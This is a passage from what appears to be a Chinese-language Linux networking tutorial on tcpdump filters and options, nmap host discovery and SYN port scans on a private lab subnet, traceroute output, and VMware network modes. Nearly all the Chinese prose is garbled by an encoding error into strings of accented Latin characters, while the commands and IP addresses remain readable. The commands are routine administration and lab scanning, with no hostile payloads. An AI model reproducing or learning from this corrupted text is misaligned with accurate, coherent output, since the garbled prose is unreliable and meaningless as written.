æŒ‡å®šç½‘å¡çš„åç§°## -nn ä¸æŠŠç«¯å£è§£ææˆåº”ç”¨å±‚åè®®## -c æŒ‡å®šæŠ“åŒ…çš„æ•°é‡## -S ä¸æŠŠéšæœºåºåˆ—å’Œç¡®è®¤åºåˆ—è§£ææˆç»å¯¹å€¼## -w æŒ‡å®šæ•°æ®åŒ…ä¿å­˜çš„ä½ç½® tcpdump å¸¸ç”¨ç¤ºä¾‹ tcpdumpåªèƒ½æŠ“å–æµç»æœ¬æœºçš„æ•°æ®åŒ…ï¼Œä¸€èˆ¬æœ‰ä¸‰ä¸ªç±»å‹ï¼Œæ¯”å¦‚æŒ‡å®šåœ°å€ï¼ŒæŒ‡å®šåè®®ï¼Œæˆ–è€…æŒ‡å®šç½‘å¡ã€‚ 3.8.1ï¼Œç»¼åˆå®ä¾‹// ç½‘å¡ã€hostã€åè®®tcp/udpã€æ˜¾ç¤ºæ ¼å¼/ä¿å­˜æ–‡ä»¶tcpdump -i eth0 host 10.1.36.95 and port 7779 -w test.pcaptcpdump -i any src host 192.168.5.100 and port 7777 -nnAtcpdump -i any dst host 192.168.5.100 and port 7777 -nnA\ttcpdump -i any udp and port 6662 -nnA //ASCIIæ˜¾ç¤º(JSONæ ¼å¼å¯ç”¨)//16è¿›åˆ¶æ˜¾ç¤ºtcpdump -i any udp port 6005 -nn -xx//æŒ‰lengthè¿‡æ»¤tcpdump -i eth0 len = 500 -nnA\ttcpdump -i eth0 len = 1000 -nnA //ipv6tcpdump icmp6 -XXtcpdump ip6 proto 6tcpdump -i ens32 ip6 proto 6 -w server_ipv6.pcap 3.8.2 é»˜è®¤å¯åŠ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œç›´æ¥å¯åŠ¨tcpdumpå°†ç›‘è§†ç¬¬ä¸€ä¸ªç½‘ç»œæ¥å£(éloå£)ä¸Šæ‰€æœ‰æµé€šçš„æ•°æ®åŒ…ã€‚è¿™æ ·æŠ“å–çš„ç»“æœä¼šéå¸¸å¤šï¼Œæ»šåŠ¨éå¸¸å¿«ã€‚ tcpdump 3.8.3, è¿‡æ»¤ä¸»æœº//æŠ“å–æ‰€æœ‰ç»è¿‡ eth0ï¼Œç›®çš„æˆ–æºåœ°å€æ˜¯ 192.168.1.70 çš„ç½‘ç»œæ•°æ®tcpdump -i eth0 host 192.168.1.70//æŠ“å–æ‰€æœ‰ç»è¿‡ eth0ï¼Œæºåœ°å€æ˜¯ 192.168.1.70 çš„ç½‘ç»œæ•°æ®tcpdump -i eth1 src host 192.168.1.70//æŠ“å–æ‰€æœ‰ç»è¿‡ eth0ï¼Œç›®çš„åœ°å€æ˜¯ 192.168.1.70 çš„ç½‘ç»œæ•°æ®tcpdump -i eth1 dst host 192.168.1.70 3.8.4 è¿‡æ»¤ç«¯å£//æŠ“å–æ‰€æœ‰ç»è¿‡ eth0ï¼Œç›®çš„æˆ–æºç«¯å£æ˜¯ 22 çš„ç½‘ç»œæ•°æ®tcpdump -i eth0 port 22//æŠ“å–æ‰€æœ‰ç»è¿‡ eth0ï¼Œæºç«¯å£æ˜¯ 22 çš„ç½‘ç»œæ•°æ®tcpdump -i eth1 src port 22//æŠ“å–æ‰€æœ‰ç»è¿‡ eth0ï¼Œç›®çš„ç«¯å£æ˜¯ 22 çš„ç½‘ç»œæ•°æ®tcpdump -i eth1 dst port 22 3.8.5 è¿‡æ»¤åè®®ï¼štcpdump -i eth0 tcptcpdump -i eth0 udptcpdump -i eth0 iptcpdump -i eth0 icmptcpdump -i eth0 arp 3.8.6ï¼Œ å¸¸ç”¨è¡¨è¾¾å¼ï¼šåœ¨tcpdumpçš„è¿‡æ»¤è¡¨è¾¾å¼ä¸­ï¼Œå„ç±»å…³é”®å­—ä¹‹é—´è¿˜èƒ½å¤Ÿé€šè¿‡å¸ƒå°”è¿ç®—ç¬¦æ¥æ„æˆç»„åˆè¡¨è¾¾å¼ï¼Œä»¥æ»¡è¶³å®é™…è¿ç”¨æ—¶çš„éœ€è¦ã€‚ å–é(not æˆ–!)ã€å’Œè¿ç®—ç¬¦(andæˆ–)ã€æˆ–è¿ç®—ç¬¦(oræˆ–||)ï¼Œ //æŠ“å–æ‰€æœ‰ç»è¿‡ eth0ï¼Œç›®çš„åœ°å€æ˜¯ 192.168.1.254 æˆ– 192.168.1.200 ç«¯å£æ˜¯ 80 çš„ TCP æ•°æ®tcpdump -i eth0 ((tcp) and (port 80) and ((dst host 192.168.1.254) or (dst host 192.168.1.200)))//æŠ“å–æ‰€æœ‰ç»è¿‡ eth1ï¼Œç›®æ ‡ MAC åœ°å€æ˜¯ 00:01:02:03:04:05 çš„ ICMP æ•°æ®tcpdump -i eth1 ((icmp) and ((ether dst host 00:01:02:03:04:05)))//æŠ“å–æ‰€æœ‰ç»è¿‡ eth1ï¼Œç›®çš„ç½‘ç»œæ˜¯ 192.168ï¼Œä½†ç›®çš„ä¸»æœºä¸æ˜¯ 192.168.1.200 çš„ TCP æ•°æ®tcpdump -i eth1 ((tcp) and ((dst net 192.168) and (not dst host 192.168.1.200))) 3.8.7 ä¿å­˜åˆ°æŒ‡å®šæ–‡ä»¶ï¼š//å®æ—¶æŠ“å–3721ç«¯å£ï¼Œå¤šæ’­åœ°å€ä¸º228.228.228.228çš„åŒ…ï¼Œç„¶åå†™å…¥228.228.228.228.pcap,ç„¶åé€šè¿‡Wiresharkåˆ†ææ•°æ®tcpdump -i any (host 228.228.228.228 port 3721) -w 228.228.228.228.pcap//å®æ—¶æŠ“å–ç«¯å£å·8000çš„GETåŒ…ï¼Œç„¶åå†™å…¥GET.logtcpdump -i eth0 ((port 8000) and (tcp[(tcp[12]2):4]=0x47455420)) -nnAl -w /tmp/GET.log 3.8.8 å…¶ä»–//æŠ“å–æ‰€æœ‰ç½‘å¡çš„åŒ…tcpdump -i any//ARPè¿‡æ»¤ï¼Œæ¯”å¦‚ä»æŒ‡å®šçš„ç½‘ç»œæ¥å£æˆªè·5ä¸ªARPæ•°æ®åŒ…ï¼Œå¹¶ä¸”ä¸å°†ç½‘ç»œåœ°å€è½¬æ¢æˆä¸»æœºåtcpdump arp -i eth0 -c 5 -n//æˆªè·åœ¨ä¸»æœºâ€œ9.185.10.57â€å’Œä¸»æœºâ€œ9.185.10.58â€æˆ–â€œ9.185.10.59â€ä¹‹é—´ä¼ é€’çš„æ•°æ®åŒ…tcpdump host 9.185.10.57 and 9.185.10.58 or 9.185.10.59 //å‡å¦‚æƒ³è¦æˆªè·ä¸»æœºâ€œ9.185.10.57â€å’Œé™¤ä¸»æœºâ€œ9.186.10.58â€å¤–ä»»ä½•å…¶ä»–ä¸»æœºä¹‹é—´é€šä¿¡çš„IPæ•°æ®åŒ…ï¼Œèƒ½å¤Ÿä½¿ç”¨å¦‚ä¸‹å‘½ä»¤tcpdump ip host 9.185.10.57 and ! 9.185.10.58 //æŠ“å–å›ç¯ç½‘å£çš„åŒ…ï¼štcpdump -i lo//é˜²æ­¢åŒ…æˆªæ–­ï¼štcpdump -s0//ä»¥æ•°å­—æ˜¾ç¤ºä¸»æœºåŠç«¯å£ï¼štcpdump -n 3.8.9 tcpdumpé€‰é¡¹// æŠ“åŒ…é€‰é¡¹ï¼š-cï¼šåœ¨æ•è·æŒ‡å®šä¸ªæ•°çš„æ•°æ®åŒ…åé€€å‡ºã€‚æ³¨æ„ï¼Œæ˜¯æœ€ç»ˆè¦è·å–è¿™ä¹ˆå¤šä¸ªåŒ…ã€‚ä¾‹å¦‚ï¼ŒæŒ‡å®š-c 10å°†è·å–10ä¸ªåŒ…ï¼Œä½†å¯èƒ½å·²ç»å¤„ç†äº†100ä¸ªåŒ…ï¼Œåªä¸è¿‡åªæœ‰10ä¸ªåŒ…æ˜¯æ»¡è¶³æ¡ä»¶çš„åŒ…ã€‚-iï¼šinterfaceï¼ŒæŒ‡å®šç›‘å¬çš„ç½‘ç»œæ¥å£ã€‚è‹¥æœªæŒ‡å®šè¯¥é€‰é¡¹ï¼Œå°†ä»ç³»ç»Ÿæ¥å£åˆ—è¡¨ä¸­æœå¯»ç¼–å·æœ€å°çš„å·²é…ç½®å¥½çš„æ¥å£(ä¸åŒ…æ‹¬loopbackæ¥å£ï¼Œè¦æŠ“å–loopbackæ¥å£ä½¿ç”¨tcpdump -i lo)ï¼Œ ï¼šä¸€æ—¦æ‰¾åˆ°ç¬¬ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„æ¥å£ï¼Œæœå¯»é©¬ä¸Šç»“æŸã€‚å¯ä»¥ä½¿ç”¨â€™anyâ€™å…³é”®å­—è¡¨ç¤ºæ‰€æœ‰ç½‘ç»œæ¥å£ã€‚ -nï¼šå¯¹åœ°å€ä»¥æ•°å­—æ–¹å¼æ˜¾å¼ï¼Œå¦åˆ™æ˜¾å¼ä¸ºä¸»æœºåï¼Œä¹Ÿå°±æ˜¯è¯´-né€‰é¡¹ä¸åšä¸»æœºåè§£æï¼ˆDNSæŸ¥è¯¢ï¼‰ã€‚-nnï¼šé™¤äº†-nçš„ä½œç”¨å¤–ï¼Œè¿˜æŠŠç«¯å£æ˜¾ç¤ºä¸ºæ•°å€¼ï¼Œå¦åˆ™æ˜¾ç¤ºç«¯å£æœåŠ¡åã€‚ï¼ˆä»¥ipå’Œportçš„æ–¹å¼æ˜¾ç¤ºæ¥æºä¸»æœºå’Œç›®çš„ä¸»æœºï¼Œè€Œä¸æ˜¯ç”¨ä¸»æœºåå’ŒæœåŠ¡ï¼‰-Nï¼šä¸æ‰“å°å‡ºhostçš„åŸŸåéƒ¨åˆ†ã€‚ä¾‹å¦‚tcpdumpå°†ä¼šæ‰“å°â€™nicâ€™è€Œä¸æ˜¯â€™nic.ddn.milâ€™ã€‚-Pï¼šæŒ‡å®šè¦æŠ“å–çš„åŒ…æ˜¯æµå…¥è¿˜æ˜¯æµå‡ºçš„åŒ…ã€‚å¯ä»¥ç»™å®šçš„å€¼ä¸ºinã€â€œoutå’Œinoutâ€ï¼Œé»˜è®¤ä¸ºinoutã€‚-s lenï¼šè®¾ç½®tcpdumpçš„æ•°æ®åŒ…æŠ“å–é•¿åº¦ä¸ºlenï¼Œå¦‚æœä¸è®¾ç½®é»˜è®¤å°†ä¼šæ˜¯65535å­—èŠ‚ã€‚å¯¹äºè¦æŠ“å–çš„æ•°æ®åŒ…è¾ƒå¤§æ—¶ï¼Œé•¿åº¦è®¾ç½®ä¸å¤Ÿå¯èƒ½ä¼šäº§ç”ŸåŒ…æˆªæ–­ï¼Œè‹¥å‡ºç°åŒ…æˆªæ–­ï¼Œ ï¼šè¾“å‡ºè¡Œä¸­ä¼šå‡ºç°[|proto]çš„æ ‡å¿—(protoå®é™…ä¼šæ˜¾ç¤ºä¸ºåè®®å)ã€‚ä½†æ˜¯æŠ“å–lenè¶Šé•¿ï¼ŒåŒ…çš„å¤„ç†æ—¶é—´è¶Šé•¿ï¼Œå¹¶ä¸”ä¼šå‡å°‘tcpdumpå¯ç¼“å­˜çš„æ•°æ®åŒ…çš„æ•°é‡ï¼Œ ï¼šä»è€Œä¼šå¯¼è‡´æ•°æ®åŒ…çš„ä¸¢å¤±ï¼Œæ‰€ä»¥åœ¨èƒ½æŠ“å–æˆ‘ä»¬æƒ³è¦çš„åŒ…çš„å‰æä¸‹ï¼ŒæŠ“å–é•¿åº¦è¶Šå°è¶Šå¥½ã€‚// è¾“å‡ºé€‰é¡¹ï¼š-eï¼šè¾“å‡ºçš„æ¯è¡Œä¸­éƒ½å°†åŒ…æ‹¬æ•°æ®é“¾è·¯å±‚å¤´éƒ¨ä¿¡æ¯ï¼Œä¾‹å¦‚æºMACå’Œç›®æ ‡MACã€‚-qï¼šå¿«é€Ÿæ‰“å°è¾“å‡ºã€‚å³æ‰“å°å¾ˆå°‘çš„åè®®ç›¸å…³ä¿¡æ¯ï¼Œä»è€Œè¾“å‡ºè¡Œéƒ½æ¯”è¾ƒç®€çŸ­ã€‚-Xï¼šè¾“å‡ºåŒ…çš„å¤´éƒ¨æ•°æ®ï¼Œä¼šä»¥16è¿›åˆ¶å’ŒASCIIä¸¤ç§æ–¹å¼åŒæ—¶è¾“å‡ºã€‚-XXï¼šè¾“å‡ºåŒ…çš„å¤´éƒ¨æ•°æ®ï¼Œä¼šä»¥16è¿›åˆ¶å’ŒASCIIä¸¤ç§æ–¹å¼åŒæ—¶è¾“å‡ºï¼Œæ›´è¯¦ç»†ã€‚-vï¼šè¾“å‡ºè¾ƒå‘¨è¯¦çš„ä¿¡æ¯ï¼Œä¾‹å¦‚IPåŒ…ä¸­çš„TTLå’ŒæœåŠ¡ç±»å‹ä¿¡æ¯ã€‚-vvï¼šäº§ç”Ÿæ¯”-væ›´è¯¦ç»†çš„è¾“å‡ºã€‚-vvvï¼šäº§ç”Ÿæ¯”-vvæ›´è¯¦ç»†çš„è¾“å‡ºã€‚// åŠŸèƒ½æ€§é€‰é¡¹ï¼š-Dï¼šåˆ—å‡ºå¯ç”¨äºæŠ“åŒ…çš„æ¥å£ã€‚å°†ä¼šåˆ—å‡ºæ¥å£çš„æ•°å€¼ç¼–å·å’Œæ¥å£åï¼Œå®ƒä»¬éƒ½å¯ä»¥ç”¨äº-iåã€‚-Fï¼šä»æŒ‡å®šçš„æ–‡æ¡£ä¸­è¯»å–è¿‡æ»¤è§„åˆ™ï¼Œå¿½ç•¥å‘½ä»¤è¡Œä¸­æŒ‡å®šçš„å…¶ä»–è¿‡æ»¤è§„åˆ™ã€‚-wï¼šå°†æˆªè·çš„æ•°æ®åŒ…ç›´æ¥å†™å…¥æŒ‡å®šçš„æ–‡æ¡£ä¸­ï¼Œä¸å¯¹å…¶è¿›è¡Œåˆ†æå’Œè¾“å‡ºã€‚å¯ä»¥åŒæ—¶é…åˆ-G timeé€‰é¡¹ä½¿å¾—è¾“å‡ºæ–‡ä»¶æ¯timeç§’å°±è‡ªåŠ¨åˆ‡æ¢åˆ°å¦ä¸€ä¸ªæ–‡ä»¶ã€‚å¯é€šè¿‡-ré€‰é¡¹è½½å…¥è¿™äº›æ–‡ä»¶ä»¥è¿›è¡Œåˆ†æå’Œæ‰“å°ã€‚-rï¼šä»æŒ‡å®šçš„æ–‡æ¡£ä¸­è¯»å–æ•°æ®åŒ…(è¯¥æ–‡æ¡£ä¸€èˆ¬é€šè¿‡-wé€‰é¡¹äº§ç”Ÿ)ã€‚ä½¿ç”¨-è¡¨ç¤ºä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–ã€‚// å…¶ä»–ï¼š-a å°†ç½‘ç»œåœ°å€å’Œå¹¿æ’­åœ°å€è½¬å˜æˆå®¹æ˜“è¯†åˆ«çš„åå­—-d å°†å·²æˆªè·çš„æ•°æ®åŒ…çš„ä»£ç ä»¥äººå®¹æ˜“ç†è§£çš„æ ¼å¼è¾“å‡ºï¼›-dd å°†å·²æˆªè·çš„æ•°æ®åŒ…çš„ä»£ç ä»¥Cç¨‹å¼çš„æ ¼å¼è¾“å‡ºï¼›-ddd å°†å·²æˆªè·çš„æ•°æ®åŒ…çš„ä»£ç ä»¥åè¿›åˆ¶æ ¼å¼è¾“å‡ºï¼›-e è¾“å‡ºæ•°æ®é“¾è·¯å±‚çš„å¤´éƒ¨ä¿¡æ¯ï¼›-f å°†internetåœ°å€ä»¥æ•°å­—å½¢å¼è¾“å‡ºï¼›-l å°†æ ‡å‡†è¾“å‡ºå˜ä¸ºè¡Œç¼“å†²æ–¹å¼ï¼›-t ä¸è¾“å‡ºæ—¶é—´æˆ³ï¼›-T å°†æˆªè·çš„æ•°æ®åŒ…ç›´æ¥è§£é‡Šä¸ºæŒ‡å®šç±»å‹çš„æŠ¥æ–‡ï¼Œç°åœ¨æ”¯æŒçš„ç±»å‹æœ‰cnfpã€rpcã€rtpã€snmpã€vatå’Œwbã€‚ 3.9 ç½‘ç»œå·¥å…·3.9.1 nmap# centos7ä¸Šå®‰è£…nmap yum install nmap -y[root@localhost ~]# nmap -v # é»˜è®¤å®‰è£…çš„6.40ï¼Œä¸æ˜¯æœ€æ–°ç‰ˆæœ¬ï¼Œyumç»å¸¸æ˜¯ä¸‹è½½ä¸äº†æœ€æ–°ç‰ˆçš„ï¼Œæœ‰é•œåƒæ›´æ–°å»¶è¿Ÿçš„é—®é¢˜ Starting Nmap 6.40 ( http://nmap.org ) at 2023-04-05 00:13 CST# å®˜ç½‘ä¸‹è½½æœ€æ–°ç‰ˆæœ¬çš„rpmåŒ…ï¼Œç„¶årpmå®‰è£…å³å¯ rpm -Uvh nmap-7.93-1.x86_64.rpm # -Uè¡¨ç¤ºå‡çº§ï¼Œå¦‚æœå·²ç»å®‰è£…äº†ä½ç‰ˆæœ¬å°±ç”¨-Uvhï¼Œå¦‚æœæ²¡æœ‰å®‰è£…è€ç‰ˆæœ¬ï¼Œé‚£ä¹ˆ-ivhå®‰è£…# æˆ‘å·²ç»ç»™å¤§å®¶ä¸‹è½½å¥½äº†ï¼Œåœ¨å·¥å…·åŒ…é‡Œé¢# ç®€å•ä½¿ç”¨ï¼š# æ¢æµ‹ipåœ°å€æ®µå“ªäº›ipåœ°å€æ˜¯å­˜æ´»çš„ï¼Œä¹Ÿå°±æ˜¯æœ‰ä¸»æœºåœ¨çº¿å¹¶ä½¿ç”¨äº†å“ªäº›ipåœ°å€ [root@localhost ~]# nmap -sn 192.168.61.0/24# æ¢æµ‹ä¸»æœºå“ªäº›ç«¯å£å¼€æ”¾ [root@localhost ~]# nmap -sS 192.168.61.0/24 # ipåœ°å€æ®µ [root@localhost ~]# nmap -sS 192.168.61.139 # å•ä¸ªipåœ°å€# å¦‚æœä½ çš„ä¸»æœºåœ¨å…¬ç½‘ä¸Šé¢ï¼Œåˆ«äººé€šè¿‡nmapç›´æ¥å°±å¯ä»¥æ‰«æä½ ï¼Œå¦‚æœå‘ç°æœ‰ä»€ä¹ˆæ¼æ´ï¼Œç›´æ¥å°±å¯ä»¥æŠŠä½ æ‹¿ä¸‹ã€‚ 3.9.2 tracerouteå’Œtracert## è¿™ä¸¤ä¸ªå·¥å…·æ˜¯è¿›è¡Œè·¯ç”±è¿½è¸ªçš„ï¼Œrouteræ˜¯è·¯ç”±çš„æ„æ€ï¼Œè·¯ç”±è¿½è¸ªçš„æ„æ€å°±æ˜¯æŸ¥çœ‹ä¸€ä¸‹æˆ‘ä»¬æƒ³è®¿é—®æŸä¸ªç½‘ç«™åˆ°åº•ä¼šç»å†å“ªäº›è®¾å¤‡åœ°å€çš„è·³è½¬ã€‚è¿™ä¸ªç”¨çš„ä¸æ˜¯å¾ˆå¤šã€‚## tracertæ˜¯windowsä¸Šè‡ªå¸¦çš„å·¥å…·ï¼šC:\\Users\\ls198tracert -d nmap.org # æ¯”å¦‚è¿½è¸ªä¸€ä¸‹nmap.orgï¼Œè¿™æ˜¯å›½å¤–çš„ç½‘ç«™ï¼Œæ‰€ä»¥æ•°æ®åŒ…åº”è¯¥æ˜¯å‡ºå›½äº†ã€‚é€šè¿‡æœ€å¤š 30 ä¸ªè·ƒç‚¹è·Ÿè¸ªåˆ° nmap.org [45.33.49.119] çš„è·¯ç”±: 1 3 ms 109 ms 6 ms 192.168.2.1 # è·¯ç”± 2 * 9 ms 4 ms 192.168.1.1 # å…‰çŒ« 3 42 ms 51 ms 12 ms 10.29.0.1 # ç”µä¿¡å±€åŸŸç½‘ 4 * * * è¯·æ±‚è¶…æ—¶ã€‚ 5 * * 198 ms 27.129.33.225 # å»ŠåŠç”µä¿¡ç½‘ç»œæœºæˆ¿ç­‰ 6 * * * è¯·æ±‚è¶…æ—¶ã€‚ 7 * * * è¯·æ±‚è¶…æ—¶ã€‚ 8 * * 28 ms 202.97.54.14 # å¤©æ´¥ç”µä¿¡ 9 254 ms 197 ms 205 ms 202.97.59.106 # å¤©æ´¥ç”µä¿¡10 * * * è¯·æ±‚è¶…æ—¶ã€‚11 181 ms 181 ms 189 ms 154.54.5.101 # ç¾å›½ åŠ åˆ©ç¦å°¼äºšå· åœ£ä½•å¡12 185 ms 190 ms 183 ms 154.54.3.138 # ç¾å›½ åŠ åˆ©ç¦å°¼äºšå· åœ£ä½•å¡13 185 ms 190 ms 189 ms 38.142.11.154 # ç¾å›½ åŠ åˆ©ç¦å°¼äºšå· åœ£ä½•å¡14 * * * è¯·æ±‚è¶…æ—¶ã€‚15 187 ms 195 ms * 45.33.49.119 # ç¾å›½ åŠ åˆ©ç¦å°¼äºšå· å¼—é‡Œè’™ç‰¹16 1027 ms 565 ms 179 ms 45.33.49.119 # ç¾å›½ åŠ åˆ©ç¦å°¼äºšå· å¼—é‡Œè’™ç‰¹## è·Ÿè¸ªå®Œæˆ ## tracerouteæ˜¯linuxä¸Šçš„å·¥å…·ï¼Œéœ€è¦å®‰è£…ä¸€ä¸‹# å®‰è£…[root@localhost ~]# yum provides traceroute[root@localhost ~]# yum install traceroute -y[root@localhost ~]# traceroute -n nmap.org# è¿™ä¸ªå·¥å…·ä¸å¥½ç”¨ï¼Œæ€»æ˜¯æŸ¥è¯¢è¶…æ—¶ï¼ŒæŸ¥ä¸åˆ°æ•°æ® 3.10 ä¿®æ”¹ç½‘å¡è®¾ç½®3.10.1 vmvareè™šæ‹Ÿæœºçš„ä¸‰ç§ç½‘ç»œæ¨¡å¼ æ¡¥æ¥æ¨¡å¼(bridged)ï¼šä¹Ÿå°±æ˜¯å°†è™šæ‹Ÿæœºçš„è™šæ‹Ÿç½‘ç»œé€‚é…å™¨ä¸ä¸»æœºçš„ç‰©ç†ç½‘ç»œé€‚é…å™¨è¿›è¡Œäº¤æ¥ï¼Œè™šæ‹Ÿæœºä¸­çš„è™šæ‹Ÿç½‘ç»œé€‚é…å™¨å¯é€šè¿‡ä¸»æœºä¸­çš„ç‰©ç†ç½‘ç»œé€‚é…å™¨ç›´æ¥è®¿é—®åˆ°å¤–éƒ¨ç½‘ç»œã€‚ç®€è€Œè¨€ä¹‹ï¼Œè¿™å°±å¥½åƒåœ¨å±€åŸŸç½‘ä¸­æ·»åŠ äº†ä¸€å°æ–°çš„ã€ç‹¬ç«‹çš„è®¡ç®—æœºä¸€æ ·ã€‚å› æ­¤ï¼Œè™šæ‹Ÿæœºä¹Ÿä¼šå ç”¨å±€åŸŸç½‘ä¸­çš„ä¸€ä¸ª IP åœ°å€ï¼Œå¹¶ä¸”å¯ä»¥å’Œå…¶ä»–ç»ˆç«¯è¿›è¡Œç›¸äº’è®¿é—®ã€‚æ¡¥æ¥æ¨¡å¼ç½‘ç»œè¿æ¥æ”¯æŒæœ‰çº¿å’Œæ— çº¿ä¸»æœºç½‘ç»œé€‚é…å™¨ã€‚å¦‚æœä½ æƒ³æŠŠè™šæ‹Ÿæœºå½“åšä¸€å°å®Œå…¨ç‹¬ç«‹çš„è®¡ç®—æœºçœ‹å¾…ï¼Œå¹¶ä¸”å…è®¸å®ƒå’Œå…¶ä»–ç»ˆç«¯ä¸€æ ·çš„è¿›è¡Œç½‘ç»œé€šä¿¡ï¼Œé‚£ä¹ˆæ¡¥æ¥æ¨¡å¼é€šå¸¸æ˜¯è™šæ‹Ÿæœºè®¿é—®ç½‘ç»œçš„æœ€ç®€å•é€”å¾„ã€‚ NATæ¨¡å¼ï¼šæ˜¯Network Address Translationçš„ç¼©å†™ï¼Œæ„å³ç½‘ç»œåœ°å€è½¬æ¢ã€‚NAT æ¨¡å¼ä¹Ÿæ˜¯ VMware åˆ›å»ºè™šæ‹Ÿæœºçš„é»˜è®¤ç½‘ç»œè¿æ¥æ¨¡å¼ã€‚ä½¿ç”¨NATæ¨¡å¼ç½‘ç»œè¿æ¥æ—¶ï¼ŒVMwareä¼šåœ¨ä¸»æœºä¸Šå»ºç«‹å•ç‹¬çš„ä¸“ç”¨ç½‘ç»œï¼Œç”¨ä»¥åœ¨ä¸»æœºå’Œè™šæ‹Ÿæœºä¹‹é—´ç›¸äº’é€šä¿¡ã€‚è™šæ‹Ÿæœºå‘å¤–éƒ¨ç½‘ç»œå‘é€çš„è¯·æ±‚æ•°æ® åŒ…è£¹ï¼Œéƒ½ä¼šäº¤ç”± NAT ç½‘ç»œé€‚é…å™¨åŠ ä¸Š ç‰¹æ®Šæ ‡è®° å¹¶ä»¥ä¸»æœºçš„åä¹‰è½¬å‘å‡ºå»ï¼Œå¤–éƒ¨ç½‘ç»œè¿”å›çš„å“åº”æ•°æ® åŒ…è£¹ï¼Œä¹Ÿæ˜¯å…ˆç”±ä¸»æœºæ¥æ”¶ï¼Œç„¶åäº¤ç”± NAT ç½‘ç»œé€‚é…å™¨æ ¹æ® ç‰¹æ®Šæ ‡è®° è¿›è¡Œè¯†åˆ«å¹¶è½¬å‘ç»™å¯¹åº”çš„è™šæ‹Ÿæœºï¼Œå› æ­¤ï¼Œè™šæ‹Ÿæœºåœ¨å¤–éƒ¨ç½‘ç»œä¸­ä¸å¿…å…·æœ‰è‡ªå·±çš„IPåœ°å€ã€‚ä»å¤–éƒ¨ç½‘ç»œæ¥çœ‹ï¼Œè™šæ‹Ÿæœºå’Œä¸»æœºåœ¨å…±äº«ä¸€ä¸ªIPåœ°å€ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œå¤–éƒ¨ç½‘ç»œç»ˆç«¯ä¹Ÿæ— æ³•è®¿é—®åˆ°è™šæ‹Ÿæœºã€‚ ä»…ä¸»æœºæ¨¡å¼(host-only)ï¼šæ˜¯ä¸€ç§æ¯” NAT æ¨¡å¼æ›´åŠ å°é—­çš„çš„ç½‘ç»œè¿æ¥æ¨¡å¼ï¼Œå®ƒå°†åˆ›å»ºå®Œå…¨åŒ…å«åœ¨ä¸»æœºä¸­çš„ä¸“ç”¨ç½‘ç»œã€‚ä»…ä¸»æœºæ¨¡å¼çš„è™šæ‹Ÿç½‘ç»œé€‚é…å™¨ä»…å¯¹ä¸»æœºå¯è§ï¼Œå¹¶åœ¨è™šæ‹Ÿæœºå’Œä¸»æœºç³»ç»Ÿä¹‹é—´æä¾›ç½‘ç»œè¿æ¥ã€‚ç›¸å¯¹äº NAT æ¨¡å¼è€Œè¨€ï¼Œä»…ä¸»æœºæ¨¡å¼ä¸å…·å¤‡ NAT åŠŸèƒ½ï¼Œå› æ­¤åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œä½¿ç”¨ä»…ä¸»æœºæ¨¡å¼ç½‘ç»œè¿æ¥çš„è™šæ‹Ÿæœºæ— æ³•è¿æ¥åˆ°Internet (åœ¨ä¸»æœºä¸Šå®‰è£…åˆé€‚çš„è·¯ç”±æˆ–ä»£ç†è½¯ä»¶ï¼Œæˆ–è€…åœ¨ Windows ç³»ç»Ÿçš„ä¸»æœºä¸Šä½¿ç”¨ Internet è¿æ¥å…±äº«åŠŸèƒ½ï¼Œä»ç„¶å¯ä»¥è®©è™šæ‹Ÿæœºè¿æ¥åˆ° Internet æˆ–å…¶ä»–ç½‘ç»œ)ã€‚åœ¨åŒä¸€å°ä¸»æœºä¸Šå¯ä»¥åˆ›å»ºå¤šä¸ªä»…ä¸»æœºæ¨¡å¼çš„è™šæ‹Ÿç½‘ç»œï¼Œå¦‚æœå¤šä¸ªè™šæ‹Ÿæœºå¤„äºåŒä¸€ä¸ªä»…ä¸»æœºæ¨¡å¼ç½‘ç»œä¸­ï¼Œé‚£ä¹ˆå®ƒä»¬ä¹‹é—´æ˜¯å¯ä»¥ç›¸äº’é€šä¿¡çš„ï¼›å¦‚æœå®ƒä»¬å¤„äºä¸åŒçš„ä»…ä¸»æœºæ¨¡å¼ç½‘ç»œï¼Œåˆ™é»˜è®¤æƒ…å†µä¸‹æ— æ³•è¿›è¡Œç›¸äº’é€šä¿¡ï¼ˆå¯é€šè¿‡åœ¨å®ƒä»¬ä¹‹é—´è®¾ç½®è·¯ç”±å™¨æ¥å®ç°ç›¸äº’é€šä¿¡ï¼‰ã€‚ ## ä»…ä¸»æœºæ¨¡å¼ä¸‹çš„è™šæ‹Ÿæœºæ˜¯ä¸èƒ½ä¸Šç½‘çš„ï¼Œå•çº¯çš„æ˜¯ç‰©ç†æœºçš„å¥´éš¶ï¼ŒåŒä¸€ä¸ªè™šæ‹Ÿç½‘ç»œçš„ä»…ä¸»æœºæ¨¡å¼çš„è™šæ‹Ÿæœºä¹‹é—´æ˜¯å¯ä»¥äº’ç›¸é€šä¿¡çš„ã€‚å’Œä¸»æœºå¯ä»¥é€šä¿¡å—ï¼Ÿè¿™ä¸ªè¦çœ‹ç½‘æ®µé…ç½®ï¼Œå¦‚æœè™šæ‹Ÿæœºå’Œä¸»æœºåœ¨åŒä¸€ä¸ªç½‘æ®µæ˜¯å¯ä»¥é€šä¿¡çš„ï¼Œå¦‚æœä¸æ˜¯ä¹Ÿä¸èƒ½é€šä¿¡ï¼Œè€Œä¸”ä»…ä¸»æœºæ¨¡å¼çš„è™šæ‹Ÿæœºåªèƒ½å’Œæœ¬ä¸»æœºé€šä¿¡ï¼Œä¸èƒ½å’Œä¸»æœºåŒä¸€ç½‘ç»œæˆ–è€…å…¬ç½‘çš„å…¶ä»–ä¸»æœºé€šä¿¡ã€‚ ç»™è™šæ‹Ÿæœºè®¾å®šç½‘ç»œæ¨¡å¼çš„é…ç½®ä½ç½®ï¼š NATæ¨¡å¼çš„ç½‘ç»œä¿¡æ¯ï¼š VMware â€“ç¼–è¾‘â€“è™šæ‹Ÿæœºç½‘è·¯ç¼–è¾‘å™¨ï¼š 3.10.2 ç»™Linuxé…ç½®é™æ€IPå¼€æœºæŸ¥çœ‹ipï¼Œå¦‚ä¸‹ ä¸¤ä¸ªç½‘å¡ï¼Œä¸¤ä¸ªipåœ°å€ ## åœ¨è™šæ‹Ÿæœºè®¾ç½®é‡Œé¢å¯ä»¥æ·»åŠ ç½‘å¡## NATçš„ipåœ°å€ï¼š192.168.61.140## 